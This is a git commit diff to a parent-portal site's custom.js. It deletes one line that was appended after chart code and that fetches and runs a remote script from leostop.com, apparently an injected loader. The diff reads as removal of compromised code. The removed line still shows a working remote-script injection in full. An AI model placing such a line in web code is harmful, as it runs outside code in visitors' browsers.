81a3150fbf329fa53f7bf0347f0426e47ae3e8de
Ashokpanja <ashok.panja@vision2k.com>
2025-12-23 10:41:07 +0530

    new
    new

--- mdcare-parent-portal/js/custom.js
+++ mdcare-parent-portal/js/custom.js
@@ -159,7 +159,6 @@ function getChartJs(type) {
   return config;
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 /*--------------------------------------
     map js
